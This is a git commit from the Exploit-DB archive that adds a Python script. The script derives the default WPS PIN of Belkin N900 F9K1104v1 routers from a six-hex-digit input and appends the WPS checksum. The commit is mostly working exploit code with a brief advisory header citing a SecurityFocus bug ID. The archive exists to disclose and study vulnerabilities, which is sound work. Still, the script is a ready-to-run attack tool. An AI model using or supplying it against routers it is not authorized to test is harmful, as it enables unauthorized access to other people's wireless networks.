b956d3726207f25c7dae531b850191b1aba40e79
Offensive Security <info@exploit-db.com>
2015-09-13 05:01:44 +0000

    DB: 2015-09-13
    14 new exploits

---
+++ platforms/hardware/remote/38164.py
@@ -0,0 +1,41 @@
+source: http://www.securityfocus.com/bid/57128/info
+
+Belkin Wireless Router is prone to a security vulnerability that may allow attackers to generate a default WPS PIN.
+
+Successfully exploiting this issue may allow attackers to generate the default WPS PIN. This may lead to other attacks.
+
+Belkin N900 F9K1104v1 is vulnerable; other versions may also be affected.
+
+@author       : e.novellalorente@student.ru.nl
+Original work : ZhaoChunsheng 04/07/2012
+ 
+'''
+ 
+import sys
+ 
+VERSION    = 0
+SUBVERSION = 2
+ 
+def usage():
+    print "[+] WPSpin %d.%d " % (VERSION, SUBVERSION)
+    print "[*] Usage : python WPSpin.py 123456"
+    sys.exit(0)
+ 
+def wps_pin_checksum(pin):
+    accum = 0
+ 
+    while(pin):
+        accum += 3 * (pin % 10)
+        pin /= 10
+        accum += pin % 10
+        pin /= 10
+    return  (10 - accum % 10) % 10
+ 
+try:
+    if (len(sys.argv[1]) == 6):
+        p = int(sys.argv[1] , 16) % 10000000
+        print "[+] WPS pin is : %07d%d" % (p, wps_pin_checksum(p))
+    else:
+        usage()
+except Exception:
+    usage()
